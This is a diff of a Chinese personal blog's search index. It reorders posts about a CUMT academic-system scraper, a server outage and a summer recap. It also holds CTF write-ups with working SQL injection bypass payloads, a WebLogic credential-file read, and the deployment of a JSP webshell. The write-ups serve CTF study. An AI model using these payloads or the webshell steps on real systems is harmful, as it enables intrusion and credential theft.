-<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><h3 id="模拟登录"><a href="#模拟登录" class="headerlink" title="模拟登录"></a>模拟登录</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>一共写了两个版本，一个是使用selenium的SlowLogin，看名字就看出来了，这个登录的慢<br>而且需要配置webdriver，登录一次大约需要8-10秒钟；另一个是基于requests的<br>FastLogin，这个顾名思义就相当的快了，登录一次不到五秒钟，速度飞起，而且可能我用的<br>vpn比较卡，在校园网上应该能更快。</p>
-<p>两个版本可以自由切换,在config中设置即可，更改login即可</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opinions:</span><br><span class="line">  - login: <span class="string">&#x27;fast&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>两个模拟登录都可以直接返回成功登录之后的cookie，可以用来爬之后的界面，非常适合二次开发，欢迎二次开发，最好给个star :)</p>
-<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>先说SlowLogin，比较无脑，获得输入框的xpath，然后直接sendkeys，这里有个比较麻烦<br>的就是验证码的问题，这里我用了webdriver的screenshot方法，将图片保存到本地，然后调用<br>百度的ocr，要花钱(5555)，而且存在识别错现象。因为本来就不是很智能，用人眼看填验证码的话<br>就更不智能了。</p>
-<p>FastLogin这个就非常智能，模拟了发包过程，通过分析登录操作可以知道，先get RSA的公钥再get验证码，分析前端加密js可知，是通过rsa对password进行了加密，我们可以用简单的用python模拟，考虑到搭建环境太复杂，这里是模拟的，没有用exejs和node.js，因此耗费了很长时间，其中jsFunction模拟了js中对RSA的加密。由于get的验证码是二进制文件<br>我们可以直接将其写入文件中，然后调用baiduocr的api识别，或者人工识别，两个函数在FastLogin中可以自由选择，可以通过config.yml进行设置</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 智能人工识别验证码</span></span><br><span class="line">code = get_code_by_people(sessions)</span><br><span class="line"><span class="comment"># 人工智能识别验证码</span></span><br><span class="line">code = get_code_by_ocr(sessions)</span><br></pre></td></tr></table></figure>
-<p>config如下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">opinions:</span><br><span class="line">  - AI: true</span><br></pre></td></tr></table></figure>
-<p>调用人工识别函数的时候比较有趣，如下，会弹出窗口，然后人工识别</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916224421.png"></p>
-<p>可以看到成功获得了cookie</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916224809.png"></p>
-<p>ocr识别的话，如下</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916225044.png"></p>
-<p>可以看到，只识别了一次，如果识别错误的话，会自动重新登录，直到登录成功</p>
-<h3 id="爬取成绩"><a href="#爬取成绩" class="headerlink" title="爬取成绩"></a>爬取成绩</h3><p>分析抓包即可，页面逻辑比较简单，post后返回的是json数据，解析，保存成了字典，{科目=&gt;[平时分，期末分，总分，学分，绩点]}，因为获得平时分时需要每一科都请求一次，因此速度比较慢，其中也有一些选项，自己探索吧，懒得写了，睡觉！</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916230422.png"></p>
-<p>一些设置如下，需要保存在config.yml中</p>
-<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">user:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">&#x27;xxxxxxxx&#x27;</span> <span class="string">学号</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">password:</span> <span class="string">&#x27;xxxxxxxxxx&#x27;</span> <span class="string">密码</span></span><br><span class="line"><span class="attr">ocr:</span> <span class="string">百度识图的api</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">&#x27;xxxxxxxxxxx&#x27;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">secret:</span> <span class="string">&#x27;xxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line"><span class="attr">opinions:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">AI:</span> <span class="literal">true</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">login:</span> <span class="string">&#x27;fast&#x27;</span></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>python实践</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
-        <tag>爬虫</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>博客主站点关闭通知</title>
-    <url>/posts/9fc12a02/</url>
-    <content><![CDATA[<p>受某种神秘力量的影响，从昨天早上开始，服务器cpu一直爆红，刚排除了一下是git的问题，重启也没用</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210927012625.png"></p>
-<p>kill掉git的进程后，只要我重新push，cpu又会重新拉到100，原因我也不清楚，导致博客无法推送到服务器，现在已启用github上的备用博客，已将域名<a href="https://haorical.xyz/">https://haorical.xyz</a>解析到位于github上的博客地址<a href="https://haorical.github.io/">https://haorical.github.io</a>，可能会造成访问速度变慢等问题。</p>
-<p>服务器问题明天我再研究一下，现在服务器已经停了，包括运行的其他网站以及api接口暂时全部无法使用，我会尽快恢复。</p>
-<p><strong>哎！马老师，发生什么事了？</strong></p>
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
-  </entry>
-  <entry>
     <title>中国矿业大学今日校园自动打卡python实现</title>
     <url>/posts/f7c1df40/</url>
     <content><![CDATA[<blockquote>
@@ -1669,7 +1604,7 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
 <h1 id="联系我"><a href="#联系我" class="headerlink" title="联系我"></a>联系我</h1><p><strong>本项目仅供学习交流使用，如作他用所承受的任何直接、间接法律责任一概与作者无关</strong><br><strong>如果此项目侵犯了您或者您公司的权益，请立即联系我删除</strong></p>
 <p>如果你有不懂的,或者需要api不会搭建的,欢迎联系我,我会看心情给你解答（狗头）</p>
 <blockquote>
-<p>邮箱： <a href="mailto:&#105;&#107;&#97;&#x65;&#107;&#107;&#107;&#x40;&#x64;&#x69;&#x6e;&#103;&#x74;&#97;&#108;&#107;&#46;&#99;&#x6f;&#109;">&#105;&#107;&#97;&#x65;&#107;&#107;&#107;&#x40;&#x64;&#x69;&#x6e;&#103;&#x74;&#97;&#108;&#107;&#46;&#99;&#x6f;&#109;</a></p>
+<p>邮箱： <a href="mailto:&#x69;&#x6b;&#97;&#x65;&#107;&#x6b;&#x6b;&#64;&#100;&#x69;&#110;&#x67;&#x74;&#x61;&#x6c;&#107;&#46;&#99;&#x6f;&#x6d;">&#x69;&#x6b;&#97;&#x65;&#107;&#x6b;&#x6b;&#64;&#100;&#x69;&#110;&#x67;&#x74;&#x61;&#x6c;&#107;&#46;&#99;&#x6f;&#x6d;</a></p>
 </blockquote>
 ]]></content>
       <categories>
@@ -1677,6 +1612,87 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       </categories>
       <tags>
         <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>博客主站点关闭通知</title>
+    <url>/posts/9fc12a02/</url>
+    <content><![CDATA[<p>受某种神秘力量的影响，从昨天早上开始，服务器cpu一直爆红，刚排除了一下是git的问题，重启也没用</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210927012625.png"></p>
+<p>kill掉git的进程后，只要我重新push，cpu又会重新拉到100，原因我也不清楚，导致博客无法推送到服务器，现在已启用github上的备用博客，已将域名<a href="https://haorical.xyz/">https://haorical.xyz</a>解析到位于github上的博客地址<a href="https://haorical.github.io/">https://haorical.github.io</a>，可能会造成访问速度变慢等问题。</p>
+<p>服务器问题明天我再研究一下，现在服务器已经停了，包括运行的其他网站以及api接口暂时全部无法使用，我会尽快恢复。</p>
+<p><strong>哎！马老师，发生什么事了？</strong></p>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>中国矿业大学正方教务爬虫</title>
+    <url>/posts/6f73e94e/</url>
+    <content><![CDATA[<h1 id="中国矿业大学正方教务爬虫"><a href="#中国矿业大学正方教务爬虫" class="headerlink" title="中国矿业大学正方教务爬虫"></a>中国矿业大学正方教务爬虫</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>项目地址：</strong></p>
+<p><a href="https://github.com/Haorical/CUMT-jwxt">https://github.com/Haorical/CUMT-jwxt</a></p>
+<p>配置好后直接运行main.py就可以体验爬取成绩的功能，代码可读性良好，适合二次开发。</p>
+<p>本着服务抗大学子的宗旨，写了这个教务爬虫，用来练手，应该会开发一段时间，目前只<br>实现了模拟登录和爬取成绩，万众瞩目的自动抢课功能由于当前没有开放选课，暂时无法<br>开发，暂时搁置。</p>
+<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><h3 id="模拟登录"><a href="#模拟登录" class="headerlink" title="模拟登录"></a>模拟登录</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>一共写了两个版本，一个是使用selenium的SlowLogin，看名字就看出来了，这个登录的慢<br>而且需要配置webdriver，登录一次大约需要8-10秒钟；另一个是基于requests的<br>FastLogin，这个顾名思义就相当的快了，登录一次不到五秒钟，速度飞起，而且可能我用的<br>vpn比较卡，在校园网上应该能更快。</p>
+<p>两个版本可以自由切换,在config中设置即可，更改login即可</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opinions:</span><br><span class="line">  - login: <span class="string">&#x27;fast&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>两个模拟登录都可以直接返回成功登录之后的cookie，可以用来爬之后的界面，非常适合二次开发，欢迎二次开发，最好给个star :)</p>
+<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>先说SlowLogin，比较无脑，获得输入框的xpath，然后直接sendkeys，这里有个比较麻烦<br>的就是验证码的问题，这里我用了webdriver的screenshot方法，将图片保存到本地，然后调用<br>百度的ocr，要花钱(5555)，而且存在识别错现象。因为本来就不是很智能，用人眼看填验证码的话<br>就更不智能了。</p>
+<p>FastLogin这个就非常智能，模拟了发包过程，通过分析登录操作可以知道，先get RSA的公钥再get验证码，分析前端加密js可知，是通过rsa对password进行了加密，我们可以用简单的用python模拟，考虑到搭建环境太复杂，这里是模拟的，没有用exejs和node.js，因此耗费了很长时间，其中jsFunction模拟了js中对RSA的加密。由于get的验证码是二进制文件<br>我们可以直接将其写入文件中，然后调用baiduocr的api识别，或者人工识别，两个函数在FastLogin中可以自由选择，可以通过config.yml进行设置</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 智能人工识别验证码</span></span><br><span class="line">code = get_code_by_people(sessions)</span><br><span class="line"><span class="comment"># 人工智能识别验证码</span></span><br><span class="line">code = get_code_by_ocr(sessions)</span><br></pre></td></tr></table></figure>
+<p>config如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">opinions:</span><br><span class="line">  - AI: true</span><br></pre></td></tr></table></figure>
+<p>调用人工识别函数的时候比较有趣，如下，会弹出窗口，然后人工识别</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916224421.png"></p>
+<p>可以看到成功获得了cookie</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916224809.png"></p>
+<p>ocr识别的话，如下</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916225044.png"></p>
+<p>可以看到，只识别了一次，如果识别错误的话，会自动重新登录，直到登录成功</p>
+<h3 id="爬取成绩"><a href="#爬取成绩" class="headerlink" title="爬取成绩"></a>爬取成绩</h3><p>分析抓包即可，页面逻辑比较简单，post后返回的是json数据，解析，保存成了字典，{科目=&gt;[平时分，期末分，总分，学分，绩点]}，因为获得平时分时需要每一科都请求一次，因此速度比较慢，其中也有一些选项，自己探索吧，懒得写了，睡觉！</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916230422.png"></p>
+<p>一些设置如下，需要保存在config.yml中</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">user:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">&#x27;xxxxxxxx&#x27;</span> <span class="string">学号</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">password:</span> <span class="string">&#x27;xxxxxxxxxx&#x27;</span> <span class="string">密码</span></span><br><span class="line"><span class="attr">ocr:</span> <span class="string">百度识图的api</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">&#x27;xxxxxxxxxxx&#x27;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">secret:</span> <span class="string">&#x27;xxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line"><span class="attr">opinions:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">AI:</span> <span class="literal">true</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">login:</span> <span class="string">&#x27;fast&#x27;</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>python实践</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+        <tag>爬虫</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>初夏赛复盘</title>
+    <url>/posts/63fc7f18/</url>
+    <content><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="sql-inject"><a href="#sql-inject" class="headerlink" title="sql_inject"></a>sql_inject</h2><blockquote>
+<p>过滤绕过</p>
+</blockquote>
+<p>|| 代替 or</p>
+<p>!(a&lt;&gt;a) 代替 =</p>
+<p>/**/ 代替 空格</p>
+<p>mid 代替 left right substr</p>
+<p>3’/<strong>/||/</strong>/!(1&lt;&gt;1)#</p>
+<p>3’/<strong>/||/</strong>/!(database()&lt;&gt;’cumtctf’)#</p>
+<p>1’/<strong>/||/</strong>/!(mid((select/<strong>/group_concat(table_name)/</strong>/from/<strong>/mysql.innodb_table_stats/</strong>/where/**/!(database_name&lt;&gt;’cumtctf’)),1,1)&lt;&gt;’f’)#;</p>
+<p>1’/<strong>/||/</strong>/!(mid((select/<strong>/group_concat(table_name)/</strong>/from/<strong>/mysql.innodb_table_stats/</strong>/where/**/!(database_name&lt;&gt;’cumtctf’)),1,34)&lt;&gt;’flag_table,no_use_table,test,users’)#;</p>
+<p>无列名注入这个有点离谱<br>直接把flag给试出来了？？？</p>
+<p>1’/<strong>/||/</strong>/(select/<strong>/(‘flag{cumtctf_sql_is_s0_e@sy}’,0)&gt;(select/</strong>/*/<strong>/from/</strong>/flag_table/<strong>/limit/</strong>/1,1));#</p>
+<h2 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h2><p>php在64位系统中，当索引大小为9223372036854775808会溢出</p>
+<pre><code>payload:web=flag&amp;a[]=1&amp;b[]=2&amp;c=9223372036854775806
+</code></pre>
+<p>jphide:</p>
+<p>这个有GUI界面不用命令输入密码就行。</p>
+<h2 id="RCE-Me"><a href="#RCE-Me" class="headerlink" title="RCE_Me"></a>RCE_Me</h2>]]></content>
+      <categories>
+        <category>ctf学习</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>sql注入</tag>
+        <tag>代码审计</tag>
       </tags>
   </entry>
   <entry>
@@ -1740,29 +1756,33 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       </tags>
   </entry>
   <entry>
-    <title>暑假总结</title>
-    <url>/posts/123f4dc2/</url>
-    <content><![CDATA[<p>不知不觉暑假结束了，这两天写完实习报告终于有时间能简单的总结一下了。</p>
-<ul>
-<li><p>python入门到精通</p>
-</li>
-<li><p>数学建模学了一点点，matlab基本是会用了</p>
-</li>
-<li><p>ctf把bugku上的web刷完了，正在刷buu，学的东西还挺多的，也打了几次线上，感觉好难，道阻且长</p>
-</li>
-<li><p>折腾服务器，搭建了私有云</p>
-</li>
-<li><p>linux 使用的更熟练了，包括docker了等等</p>
-</li>
-<li><p>学会了git使用外加GitHub，之前不是很会</p>
-</li>
-<li><p>洛克王国天梯打到了高级段位</p>
-</li>
-</ul>
+    <title>国庆赛部分赛题复现</title>
+    <url>/posts/bfdb9200/</url>
+    <content><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a>sql2</h3><blockquote>
+<p>环境有点问题，复现一半出不来了</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查库名</span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>group_concat(db),<span class="number">2</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sys.schema_object_overview#</span><br><span class="line"></span><br><span class="line">查表名</span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span>admin<span class="string">&#x27;/**/union/**/select/**/group_concat(table_name),2/**/from/**/sys.schema_table_statistics/**/where/**/table_schema=&#x27;</span>flagisHere<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">无列名注入</span></span><br><span class="line"><span class="string">username=admin&amp;passwd=admin&#x27;</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(a)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flagisHere.flAg</span><br></pre></td></tr></table></figure>
+
+<h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>按照wp的反弹shell没打通</p>
+<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>这个题学到的挺多的</p>
+<p>先通过任意文件读取漏洞获得密钥和密文</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;config&#x2F;config.xml</span><br><span class="line">.&#x2F;security&#x2F;SerializedSystemIni.dat</span><br></pre></td></tr></table></figure>
+
+<p>然后用这个<a href="https://github.com/TideSec/Decrypt_Weblogic_Password">https://github.com/TideSec/Decrypt_Weblogic_Password</a>文章中提到的，获得密码，登入后台，部署木马。</p>
+<p>war木马，就是将jsp木马压缩成zip，然后改后缀就行，这里把war部署到服务器上。</p>
+<p>访问大马文件<a href="http://host/test/JspSpy.jsp">http://host/test/JspSpy.jsp</a></p>
+<p>找到个flag.tar，结果我解压的时候给破坏了，现在服务器里没flag了，它这个是所有人一个环境，后面复现的人得多少有点懵逼，所以：</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20211013215350.png"></p>
+<p>我在根目录里面创建了个假的flag（哈哈哈，逃</p>
 ]]></content>
       <categories>
-        <category>随笔</category>
+        <category>ctf学习</category>
       </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>sql注入</tag>
+      </tags>
   </entry>
   <entry>
     <title>线性规划与整数线性规划</title>
@@ -1806,35 +1826,6 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       </tags>
   </entry>
   <entry>
-    <title>国庆赛部分赛题复现</title>
-    <url>/posts/bfdb9200/</url>
-    <content><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a>sql2</h3><blockquote>
-<p>环境有点问题，复现一半出不来了</p>
-</blockquote>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查库名</span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>group_concat(db),<span class="number">2</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sys.schema_object_overview#</span><br><span class="line"></span><br><span class="line">查表名</span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span>admin<span class="string">&#x27;/**/union/**/select/**/group_concat(table_name),2/**/from/**/sys.schema_table_statistics/**/where/**/table_schema=&#x27;</span>flagisHere<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">无列名注入</span></span><br><span class="line"><span class="string">username=admin&amp;passwd=admin&#x27;</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(a)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flagisHere.flAg</span><br></pre></td></tr></table></figure>
-
-<h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>按照wp的反弹shell没打通</p>
-<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>这个题学到的挺多的</p>
-<p>先通过任意文件读取漏洞获得密钥和密文</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;config&#x2F;config.xml</span><br><span class="line">.&#x2F;security&#x2F;SerializedSystemIni.dat</span><br></pre></td></tr></table></figure>
-
-<p>然后用这个<a href="https://github.com/TideSec/Decrypt_Weblogic_Password">https://github.com/TideSec/Decrypt_Weblogic_Password</a>文章中提到的，获得密码，登入后台，部署木马。</p>
-<p>war木马，就是将jsp木马压缩成zip，然后改后缀就行，这里把war部署到服务器上。</p>
-<p>访问大马文件<a href="http://host/test/JspSpy.jsp">http://host/test/JspSpy.jsp</a></p>
-<p>找到个flag.tar，结果我解压的时候给破坏了，现在服务器里没flag了，它这个是所有人一个环境，后面复现的人得多少有点懵逼，所以：</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20211013215350.png"></p>
-<p>我在根目录里面创建了个假的flag（哈哈哈，逃</p>
-]]></content>
-      <categories>
-        <category>ctf学习</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>爬取冰冰vlog.001评论&amp;&amp;做词云</title>
     <url>/posts/6d65a59f/</url>
     <content><![CDATA[<blockquote>
@@ -1869,6 +1860,31 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       <tags>
         <tag>python</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>暑假总结</title>
+    <url>/posts/123f4dc2/</url>
+    <content><![CDATA[<p>不知不觉暑假结束了，这两天写完实习报告终于有时间能简单的总结一下了。</p>
+<ul>
+<li><p>python入门到精通</p>
+</li>
+<li><p>数学建模学了一点点，matlab基本是会用了</p>
+</li>
+<li><p>ctf把bugku上的web刷完了，正在刷buu，学的东西还挺多的，也打了几次线上，感觉好难，道阻且长</p>
+</li>
+<li><p>折腾服务器，搭建了私有云</p>
+</li>
+<li><p>linux 使用的更熟练了，包括docker了等等</p>
+</li>
+<li><p>学会了git使用外加GitHub，之前不是很会</p>
+</li>
+<li><p>洛克王国天梯打到了高级段位</p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
   </entry>
   <entry>
     <title>蓝桥杯感想</title>
